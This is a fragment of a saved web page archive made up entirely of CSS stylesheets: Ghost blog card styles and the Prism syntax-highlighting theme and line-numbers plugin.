; line-height: 1em; text-align: center; text-decoration: none; letter-spaci=
ng: 0.2px; white-space: nowrap; text-overflow: ellipsis; color: rgb(21, 21,=
 21); height: 2.7em; padding: 0px 1.2em; transition: opacity 0.2s ease 0s; =
}

.kg-header-card h2 + a.kg-header-card-button, .kg-header-card h3 + a.kg-hea=
der-card-button { margin: 1.75em 0px 0px; }

.kg-header-card a.kg-header-card-button:hover { opacity: 0.85; }

.kg-header-card.kg-size-large a.kg-header-card-button { font-size: 1.1em; h=
eight: 2.9em; }

.kg-header-card.kg-size-large h2 + a.kg-header-card-button, .kg-header-card=
.kg-size-large h3 + a.kg-header-card-button { margin-top: 2em; }

.kg-header-card.kg-size-small a.kg-header-card-button { height: 2.4em; font=
-size: 1em; }

.kg-header-card.kg-size-small h2 + a.kg-header-card-button, .kg-header-card=
.kg-size-small h3 + a.kg-header-card-button { margin-top: 1.5em; }

.kg-header-card.kg-style-dark a.kg-header-card-button, .kg-header-card.kg-s=
tyle-image a.kg-header-card-button { background: rgb(255, 255, 255); color:=
 rgb(21, 21, 21); }

.kg-header-card.kg-style-light a.kg-header-card-button { background: var(--=
ghost-accent-color); color: rgb(255, 255, 255); }

.kg-header-card.kg-style-accent a.kg-header-card-button { background: rgb(2=
55, 255, 255); color: rgb(21, 21, 21); }

@media (max-width: 640px) {
  .kg-header-card { padding-left: 1em; padding-right: 1em; }
  .kg-header-card h2.kg-header-card-header { font-size: 3.5em; }
  .kg-header-card.kg-size-large h2.kg-header-card-header { font-size: 4em; =
}
  .kg-header-card.kg-size-small h2.kg-header-card-header { font-size: 3em; =
}
  .kg-header-card h3.kg-header-card-subheader { font-size: 1.25em; }
  .kg-header-card.kg-size-large h3.kg-header-card-subheader { font-size: 1.=
5em; }
  .kg-header-card.kg-size-small h3.kg-header-card-subheader { font-size: 1e=
m; }
}

.kg-nft-card, .kg-nft-card * { box-sizing: border-box; }

.kg-nft-card { display: flex; flex-direction: column; align-items: center; =
width: 100%; margin-left: auto; margin-right: auto; }

.kg-nft-card a.kg-nft-card-container { position: static; display: flex; fle=
x: 1 1 auto; flex-direction: column; text-decoration: none; font-family: -a=
pple-system, BlinkMacSystemFont, "avenir next", avenir, "helvetica neue", h=
elvetica, ubuntu, roboto, noto, "segoe ui", arial, sans-serif; font-size: 1=
4px; font-weight: 400; box-shadow: rgba(0, 0, 0, 0.1) 0px 2px 6px -2px, rgb=
a(0, 0, 0, 0.4) 0px 0px 1px; width: 100%; max-width: 512px; color: rgb(34, =
34, 34); background: rgb(255, 255, 255); border-radius: 5px; transition: no=
ne 0s ease 0s; }

.kg-nft-card * { position: static; }

.kg-nft-metadata { padding: 20px; width: 100%; }

.kg-nft-image { border-radius: 5px 5px 0px 0px; width: 100%; }

.kg-nft-header { display: flex; justify-content: space-between; align-items=
: flex-start; gap: 20px; }

.kg-nft-header h4.kg-nft-title { font-family: inherit; font-size: 19px; fon=
t-weight: 700; line-height: 1.3em; min-width: unset; max-width: unset; marg=
in: 0px; color: rgb(34, 34, 34); }

.kg-nft-opensea-logo { margin-top: 2px; width: 100px; object-fit: scale-dow=
n; }

.kg-nft-card p.kg-nft-description, .kg-nft-creator { font-family: inherit; =
line-height: 1.4em; margin: 4px 0px 0px; color: rgb(171, 171, 171); }

.kg-nft-creator span { font-weight: 500; color: rgb(34, 34, 34); }

.kg-nft-card p.kg-nft-description { font-size: 14px; margin: 20px 0px 0px; =
color: rgb(34, 34, 34); }

.kg-product-card, .kg-product-card * { box-sizing: border-box; }

.kg-product-card { display: flex; align-items: center; flex-direction: colu=
mn; width: 100%; }

.kg-product-card-container { display: grid; grid-template-columns: auto min=
-content; align-items: center; row-gap: 16px; background: 0px 0px; max-widt=
h: 550px; padding: 20px; width: 100%; border-radius: 5px; box-shadow: rgba(=
124, 139, 154, 0.25) 0px 0px 0px 1px inset; }

.kg-product-card-image { grid-column: 1 / 3; justify-self: center; }

.kg-product-card-title-container { grid-column: 1 / 2; }

.kg-product-card h4.kg-product-card-title { font-family: -apple-system, Bli=
nkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans"=
, "Droid Sans", "Helvetica Neue", sans-serif; text-decoration: none; font-w=
eight: 700; font-size: 1.4em; margin-top: 0px; margin-bottom: 0px; line-hei=
ght: 1.15em; }

.kg-product-card-description { grid-column: 1 / 3; }

.kg-product-card .kg-product-card-description ol, .kg-product-card .kg-prod=
uct-card-description p, .kg-product-card .kg-product-card-description ul { =
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,=
 Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif=
; font-size: 0.95em; line-height: 1.5em; opacity: 0.7; margin-bottom: 0px; =
}

.kg-product-card .kg-product-card-description p:first-of-type { margin-top:=
 -4px; }

.kg-product-card .kg-product-card-description ol, .kg-product-card .kg-prod=
uct-card-description p:not(:first-of-type), .kg-product-card .kg-product-ca=
rd-description ul { margin-top: 0.95em; }

.kg-product-card .kg-product-card-description li + li, .kg-toggle-card li +=
 li { margin-top: 0.5em; }

.kg-product-card-rating { display: flex; align-items: center; grid-column: =
2 / 3; place-self: start end; padding-left: 16px; }

@media (max-width: 400px) {
  .kg-product-card-title-container { grid-column: 1 / 3; }
  .kg-product-card-rating { grid-column: 1 / 3; justify-self: start; margin=
-top: -15px; padding-left: 0px; }
}

.kg-product-card-rating-star { height: 28px; width: 20px; }

.kg-product-card-rating-star svg { width: 16px; height: 16px; fill: current=
color; opacity: 0.15; }

.kg-product-card a.kg-product-card-button { justify-content: center; grid-c=
olumn: 1 / 3; display: flex; position: static; align-items: center; font-fa=
mily: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu=
, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-=
size: 0.95em; font-weight: 600; line-height: 1em; text-decoration: none; wi=
dth: 100%; height: 2.4em; border-radius: 5px; padding: 0px 1.2em; transitio=
n: opacity 0.2s ease-in-out 0s; }

.kg-product-card a.kg-product-card-btn-accent { background-color: var(--gho=
st-accent-color); color: rgb(255, 255, 255); }

.kg-toggle-card, .kg-toggle-card * { box-sizing: border-box; }

.kg-toggle-card { background: 0px 0px; box-shadow: rgba(124, 139, 154, 0.25=
) 0px 0px 0px 1px inset; border-radius: 4px; padding: 1.2em; }

.kg-toggle-card[data-kg-toggle-state=3D"close"] .kg-toggle-content { height=
: 0px; overflow: hidden; transition: opacity 0.5s ease 0s, top 0.35s ease 0=
s; opacity: 0; top: -0.5em; position: relative; }

.kg-toggle-content { height: auto; opacity: 1; transition: opacity 1s ease =
0s, top 0.35s ease 0s; top: 0px; position: relative; }

.kg-toggle-card[data-kg-toggle-state=3D"close"] svg { transform: unset; }

.kg-toggle-heading { cursor: pointer; display: flex; justify-content: space=
-between; align-items: flex-start; }

.kg-toggle-card h4.kg-toggle-heading-text { font-size: 1.15em; font-weight:=
 700; line-height: 1.3em; margin-top: 0px; margin-bottom: 0px; }

.kg-toggle-content p:first-of-type { margin-top: 0.5em; }

.kg-toggle-card .kg-toggle-content ol, .kg-toggle-card .kg-toggle-content p=
, .kg-toggle-card .kg-toggle-content ul { font-size: 0.95em; line-height: 1=
.5em; margin-top: 0.95em; margin-bottom: 0px; }

.kg-toggle-card-icon { height: 24px; width: 24px; display: flex; justify-co=
ntent: center; align-items: center; margin-left: 1em; background: 0px 0px; =
border: 0px; }

.kg-toggle-heading svg { width: 14px; color: rgba(124, 139, 154, 0.5); tran=
sition: all 0.3s ease 0s; transform: rotate(-180deg); }

.kg-toggle-heading path { fill: none; stroke: currentcolor; stroke-linecap:=
 round; stroke-linejoin: round; stroke-width: 1.5; fill-rule: evenodd; }

.kg-toggle-card + .kg-toggle-card { margin-top: 1em; }

.kg-video-card, .kg-video-card * { box-sizing: border-box; }

.kg-video-card { position: relative; --seek-before-width: 0%; --volume-befo=
re-width: 100%; --buffered-width: 0%; }

.kg-video-card video { display: block; max-width: 100%; height: auto; }

.kg-video-container { position: relative; display: flex; flex-direction: co=
lumn; align-items: center; }

.kg-video-large-play-icon, .kg-video-overlay { display: flex; justify-conte=
nt: center; align-items: center; transition: opacity 0.2s ease-in-out 0s; }

.kg-video-overlay { position: absolute; inset: 0px; background-image: linea=
r-gradient(rgba(0, 0, 0, 0.3) 0px, transparent 70%, transparent 100%); z-in=
dex: 999; }

.kg-video-large-play-icon { width: 72px; height: 72px; padding: 0px; backgr=
ound: rgba(0, 0, 0, 0.5); border-radius: 50%; }

.kg-video-large-play-icon svg { width: 20px; height: auto; margin-left: 2px=
; fill: rgb(255, 255, 255); }

.kg-video-player-container { position: absolute; bottom: 0px; width: 100%; =
height: 80px; background: linear-gradient(transparent, rgba(0, 0, 0, 0.5));=
 z-index: 999; transition: opacity 0.2s ease-in-out 0s; }

.kg-video-player { position: absolute; bottom: 0px; display: flex; align-it=
ems: center; width: 100%; z-index: 9999; padding: 12px 16px; }

.kg-video-current-time, .kg-video-time { font-family: inherit; font-size: 0=
.85em; font-weight: 500; line-height: 1.4em; white-space: nowrap; }

.kg-video-current-time { min-width: 38px; padding: 0px 4px; color: rgb(255,=
 255, 255); }

.kg-video-time { color: rgba(255, 255, 255, 0.6); }

.kg-video-duration { padding: 0px 4px; }

.kg-video-pause-icon, .kg-video-play-icon { position: relative; padding: 0p=
x 4px 0px 0px; font-size: 0px; background: 0px 0px; }

.kg-video-hide { display: none !important; }

.kg-video-hide-animated { transition: opacity 0.2s ease-in-out 0s; cursor: =
initial; opacity: 0 !important; }

.kg-video-pause-icon svg, .kg-video-play-icon svg { width: 14px; height: 14=
px; fill: rgb(255, 255, 255); }

.kg-video-seek-slider { flex-grow: 1; margin: 0px 4px; }

@media (max-width: 520px) {
  .kg-video-seek-slider { display: none; }
}

.kg-video-playback-rate { min-width: 37px; padding: 0px 4px; color: rgb(255=
, 255, 255); font-family: inherit; font-size: 0.85em; font-weight: 600; lin=
e-height: 1.4em; text-align: left; background: 0px 0px; white-space: nowrap=
; }

@media (max-width: 520px) {
  .kg-video-playback-rate { padding-left: 8px; }
}

.kg-video-mute-icon, .kg-video-unmute-icon { position: relative; bottom: -1=
px; padding: 0px 4px; font-size: 0px; background: 0px 0px; }

@media (max-width: 520px) {
  .kg-video-mute-icon, .kg-video-unmute-icon { margin-left: auto; }
}

.kg-video-mute-icon svg, .kg-video-unmute-icon svg { width: 16px; height: 1=
6px; fill: rgb(255, 255, 255); }

.kg-video-volume-slider { width: 80px; }

@media (max-width: 300px) {
  .kg-video-volume-slider { display: none; }
}

.kg-video-seek-slider::before, .kg-video-volume-slider::before { content: "=
"; position: absolute; left: 0px; height: 4px; cursor: pointer; background-=
color: rgb(235, 238, 240); border-radius: 2px; width: var(--seek-before-wid=
th) !important; }

.kg-video-volume-slider::before { width: var(--volume-before-width) !import=
ant; }

.kg-video-card input[type=3D"range"] { position: relative; appearance: none=
; background: 0px 0px; height: auto; padding: 0px; border: 0px; }

.kg-video-card input[type=3D"range"]::-webkit-slider-thumb { appearance: no=
ne; }

.kg-video-card input[type=3D"range"]::-webkit-slider-runnable-track { width=
: 100%; height: 4px; cursor: pointer; background: rgba(255, 255, 255, 0.2);=
 border-radius: 2px; }

.kg-video-card input[type=3D"range"]::-webkit-slider-thumb { position: rela=
tive; box-sizing: content-box; width: 13px; height: 13px; margin: -5px 0px =
0px; border: 0px; cursor: pointer; background: rgb(255, 255, 255); border-r=
adius: 50%; box-shadow: rgba(0, 0, 0, 0.08) 0px 0px 0px 1px, rgba(0, 0, 0, =
0.24) 0px 1px 4px; }

.kg-video-card input[type=3D"range"]:active::-webkit-slider-thumb { transfo=
rm: scale(1.2); }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css

@charset "utf-8";

code[class*=3D"language-"], pre[class*=3D"language-"] { color: rgb(248, 248=
, 242); background: 0px 0px; text-shadow: rgba(0, 0, 0, 0.3) 0px 1px; font-=
family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace; font-siz=
e: 1em; text-align: left; white-space: pre; word-spacing: normal; word-brea=
k: normal; overflow-wrap: normal; line-height: 1.5; tab-size: 4; hyphens: n=
one; }

pre[class*=3D"language-"] { padding: 1em; margin: 0.5em 0px; overflow: auto=
; border-radius: 0.3em; }

:not(pre) > code[class*=3D"language-"], pre[class*=3D"language-"] { backgro=
und: rgb(39, 40, 34); }

:not(pre) > code[class*=3D"language-"] { padding: 0.1em; border-radius: 0.3=
em; white-space: normal; }

.token.cdata, .token.comment, .token.doctype, .token.prolog { color: rgb(13=
0, 146, 162); }

.token.punctuation { color: rgb(248, 248, 242); }

.token.namespace { opacity: 0.7; }

.token.constant, .token.deleted, .token.property, .token.symbol, .token.tag=
 { color: rgb(249, 38, 114); }

.token.boolean, .token.number { color: rgb(174, 129, 255); }

.token.attr-name, .token.builtin, .token.char, .token.inserted, .token.sele=
ctor, .token.string { color: rgb(166, 226, 46); }

.language-css .token.string, .style .token.string, .token.entity, .token.op=
erator, .token.url, .token.variable { color: rgb(248, 248, 242); }

.token.atrule, .token.attr-value, .token.class-name, .token.function { colo=
r: rgb(230, 219, 116); }

.token.keyword { color: rgb(102, 217, 239); }

.token.important, .token.regex { color: rgb(253, 151, 31); }

.token.bold, .token.important { font-weight: 700; }

.token.italic { font-style: italic; }

.token.entity { cursor: help; }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css

@charset "utf-8";

pre[class*=3D"language-"].line-numbers { position: relative; padding-left: =
3.8em; counter-reset: linenumber 0; }

pre[class*=3D"language-"].line-numbers > code { position: relative; white-s=
pace: inherit; }

.line-numbers .line-numbers-rows { position: absolute; pointer-events: none=
; top: 0px; font-size: 100%; left: -3.8em; width: 3em; letter-spacing: -1px=
; border-right: 1px solid rgb(153, 153, 153); user-select: none; }

.line-numbers-rows > span { display: block; counter-increment: linenumber 1=
; }

.line-numbers-rows > span::before { content: counter(linenumber); color: rg=
b(153, 153, 153); display: block; padding-right: 0.8em; text-align: right; }
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1------
